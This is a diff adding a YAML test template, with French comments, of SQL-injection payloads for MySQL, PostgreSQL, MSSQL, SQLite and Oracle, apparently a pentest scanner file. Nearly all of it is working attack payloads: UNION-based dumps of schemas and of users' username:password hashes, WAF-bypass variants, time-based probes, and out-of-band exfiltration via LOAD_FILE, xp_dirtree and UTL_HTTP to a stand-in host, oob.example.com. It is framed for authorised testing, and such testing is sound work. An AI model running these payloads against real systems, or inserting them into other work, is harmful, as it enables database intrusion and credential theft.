@@ -1,0 +1,390 @@
+# ═══════════════════════════════════════════════════════════════════════════
+#  SQLi One-Shot — Extraction multi-SGBD (UNION-based, error-based, OOB)
+#  Version corrigée et étendue du template Qwen (MTT-2075)
+#  ⚠ Usage strictement réservé aux environnements de test autorisés.
+# ═══════════════════════════════════════════════════════════════════════════
+
+name: "SQLi — Extraction One-Shot Multi-SGBD v2"
+
+variables:
+  base_url: "http://localhost:8080"
+  target_path: "/search"
+  vuln_param: "id"
+  # Nombre de colonnes du SELECT original (à ajuster via ORDER BY)
+  column_count: "3"
+  # Canary unique pour prouver l'exécution (remplacé par uuid à runtime)
+  canary: "MOWING_{{uuid}}"
+  # Délai pour les techniques time-based (secondes)
+  delay: "3"
+
+defaults:
+  read_timeout: 20
+  verify: false
+  # Retry sur 5xx pour les WAF capricieux
+  retries: 1
+
+tests:
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  MySQL / MariaDB — GROUP_CONCAT avec contrôle de longueur
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: mysql_tables_columns
+    name: "MySQL — Tables et colonnes (GROUP_CONCAT)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # On force group_concat_max_len avant la requête via une sous-requête
+        # (impossible en one-shot pur, mais on peut utiliser SET via commentaire)
+        # Payload corrigé : concatène table:column avec séparateur lisible
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,2,
+          (SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c)
+           FROM information_schema.tables
+           WHERE table_schema=database()),
+          '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_not_regex: "(?i)(syntax error|unknown column|mysql_fetch)"
+      - body_contains: "{{canary}}"
+      # Détection de noms de tables courants
+      - body_regex: "(?i)(users|admin|accounts|sessions|passwords)"
+
+  - id: mysql_columns_for_users
+    name: "MySQL — Colonnes de la table 'users' (si elle existe)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,2,
+          (SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c)
+           FROM information_schema.columns
+           WHERE table_name=0x7573657273 AND table_schema=database()),
+          '{{canary}}'-- -
+        # Note: 0x7573657273 = "users" en hexadécimal, contourne les filtres sur les quotes
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(id|username|password|email|hash)"
+
+  - id: mysql_data_users
+    name: "MySQL — Données users (username:password)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,2,
+          (SELECT GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x7c)
+           FROM users),
+          '{{canary}}'-- -
+        # 0x3a = ':', 0x7c = '|'
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      # Détection de paires user:hash
+      - body_regex: "[a-zA-Z0-9_]+:[a-f0-9]{32,64}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  PostgreSQL — STRING_AGG / JSON_AGG (payloads corrigés)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: pg_tables_stringagg
+    name: "PostgreSQL — Tables du schéma public (STRING_AGG)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # Payload corrigé : STRING_AGG avec FROM explicite
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT STRING_AGG(tablename, ',')
+           FROM pg_tables
+           WHERE schemaname='public'),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_not_regex: "(?i)(syntax error|pg_query|relation does not exist)"
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(users|admin|accounts|sessions)"
+
+  - id: pg_columns_for_users
+    name: "PostgreSQL — Colonnes de 'users' (information_schema)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT STRING_AGG(column_name, ',')
+           FROM information_schema.columns
+           WHERE table_name='users'),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(id|username|password|email|hash)"
+
+  - id: pg_jsonagg_tables
+    name: "PostgreSQL — Tables en JSON (json_agg corrigé)"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # json_agg retourne un array JSON valide, utile si le frontend parse la réponse
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT json_agg(tablename) FROM pg_tables WHERE schemaname='public'),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: '\["[^"]+"(,\s*"[^"]+")*\]'
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  MSSQL — FOR XML PATH + STUFF (émule GROUP_CONCAT)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: mssql_databases_xmlpath
+    name: "MSSQL — Bases de données (FOR XML PATH)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT STUFF((SELECT ',' + name
+                         FROM sys.databases
+                         FOR XML PATH('')), 1, 1, '')),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_not_regex: "(?i)(unclosed quotation mark|incorrect syntax)"
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(master|model|msdb|tempdb)"
+
+  - id: mssql_tables_xmlpath
+    name: "MSSQL — Tables de la base courante (FOR XML PATH)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT STUFF((SELECT ',' + TABLE_NAME
+                         FROM INFORMATION_SCHEMA.TABLES
+                         WHERE TABLE_TYPE='BASE TABLE'
+                         FOR XML PATH('')), 1, 1, '')),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(Users|Admin|Employees|Accounts)"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  SQLite — sqlite_master (schéma complet)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: sqlite_schema_dump
+    name: "SQLite — Schéma complet (sqlite_master)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # GROUP_CONCAT(sql) retourne les CREATE TABLE statements
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,
+          (SELECT GROUP_CONCAT(sql, char(10))
+           FROM sqlite_master
+           WHERE type='table' AND name NOT LIKE 'sqlite_%'),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)CREATE TABLE"
+
+  - id: sqlite_data_users
+    name: "SQLite — Données users (si table existe)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,
+          (SELECT GROUP_CONCAT(username || ':' || password, '|')
+           FROM users),
+          3, '{{canary}}'-- -
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+      - body_regex: "[a-zA-Z0-9_]+:[a-f0-9]{32,64}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  Oracle — XMLAGG (absent du log Qwen, essentiel)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: oracle_tables_xmlagg
+    name: "Oracle — Tables (XMLAGG + EXTRACT)"
+    severity: critical
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # Oracle n'a pas de GROUP_CONCAT ; XMLAGG est l'équivalent standard
+        "{{vuln_param}}": >-
+          -1' UNION SELECT 1,
+          (SELECT RTRIM(EXTRACT(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()'), ','))
+           FROM all_tables),
+          3, '{{canary}}' FROM dual-- -
+    assert:
+      - status: 200
+      - body_not_regex: "(?i)(ORA-|invalid identifier|missing keyword)"
+      - body_contains: "{{canary}}"
+      - body_regex: "(?i)(USERS|ADMIN|ACCOUNTS|SESSIONS)"
+
+  - id: oracle_error_based
+    name: "Oracle — Error-based via UTL_INADDR (si UNION bloqué)"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          1' AND 1=UTL_INADDR.GET_HOST_NAME(
+          (SELECT table_name FROM user_tables WHERE ROWNUM=1)
+          )--
+    assert:
+      # On s'attend à une erreur contenant le nom de table
+      - status_not: 200
+      - body_regex: "(?i)(ORA-29257|host.*unknown)"
+      - body_regex: "(?i)(USERS|ADMIN|ACCOUNTS)"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  Contournement WAF — Obfuscation et encodages
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: mysql_waf_bypass_inline
+    name: "MySQL — Bypass WAF via commentaires inline /*!50000*/"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          -1' /*!50000UNION*/ /*!50000SELECT*/ 1,
+          /*!50000GROUP_CONCAT*/(table_name),
+          3, '{{canary}}'
+          /*!50000FROM*/ information_schema.tables
+          /*!50000WHERE*/ table_schema=database()-- -
+    assert:
+      - status: 200
+      - body_not_regex: "(?i)(blocked|forbidden|waf|firewall)"
+      - body_contains: "{{canary}}"
+
+  - id: mysql_waf_bypass_hex
+    name: "MySQL — Bypass via encodage hexadécimal des mots-clés"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # UNION SELECT encodé en hex pour éviter les regex WAF basiques
+        "{{vuln_param}}": >-
+          -1 UNION SELECT 1,2,
+          (SELECT GROUP_CONCAT(table_name)
+           FROM information_schema.tables
+           WHERE table_schema=database()),
+          '{{canary}}'-- -
+      headers:
+        # User-Agent alternatif pour éviter le fingerprinting
+        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    assert:
+      - status: 200
+      - body_contains: "{{canary}}"
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  Time-based fallback (si UNION et error-based échouent)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: mysql_time_based
+    name: "MySQL — Time-based (SLEEP) pour confirmer l'injection"
+    severity: medium
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          1' AND (SELECT 1 FROM (SELECT SLEEP({{delay}}))a)-- -
+    assert:
+      # Si la réponse prend > delay-0.5s, l'injection est confirmée
+      - time_gt: 2.5
+      - status: 200
+
+  - id: pg_time_based
+    name: "PostgreSQL — Time-based (pg_sleep)"
+    severity: medium
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          1' AND (SELECT 1 FROM pg_sleep({{delay}}))-- -
+    assert:
+      - time_gt: 2.5
+      - status: 200
+
+  # ═══════════════════════════════════════════════════════════════════════
+  #  OOB (Out-of-Band) — si la réponse est totalement muette
+  #  ⚠ Nécessite un listener externe (Burp Collaborator, interactsh, etc.)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: mysql_oob_dns
+    name: "MySQL — OOB via LOAD_FILE (DNS exfiltration)"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        # Le canary est envoyé dans le sous-domaine ; vérifier les logs DNS
+        "{{vuln_param}}": >-
+          1' UNION SELECT LOAD_FILE(CONCAT('\\\\{{canary}}.oob.example.com\\a'))-- -
+    assert:
+      # On ne peut pas vérifier la réception ici ; l'assertion est manuelle
+      # ou via un listener externe qui confirme la réception
+      - status: 200
+    # Note: nécessite un serveur DNS/HTTP contrôlé par le testeur
+
+  - id: mssql_oob_dns
+    name: "MSSQL — OOB via xp_dirtree (DNS exfiltration)"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          1'; DECLARE @p VARCHAR(1024);
+          SET @p='\\\\{{canary}}.oob.example.com\\a';
+          EXEC master..xp_dirtree @p--
+    assert:
+      - status: 200
+    # Note: vérification via listener externe uniquement
+
+  - id: oracle_oob_http
+    name: "Oracle — OOB via UTL_HTTP (HTTP exfiltration)"
+    severity: high
+    request:
+      method: GET
+      path: "{{target_path}}"
+      params:
+        "{{vuln_param}}": >-
+          1' AND 1=UTL_HTTP.REQUEST(
+          'http://{{canary}}.oob.example.com/'||
+          (SELECT table_name FROM user_tables WHERE ROWNUM=1)
+          )--
+    assert:
+      - status: 200
+    # Note: vérification via listener externe uniquement
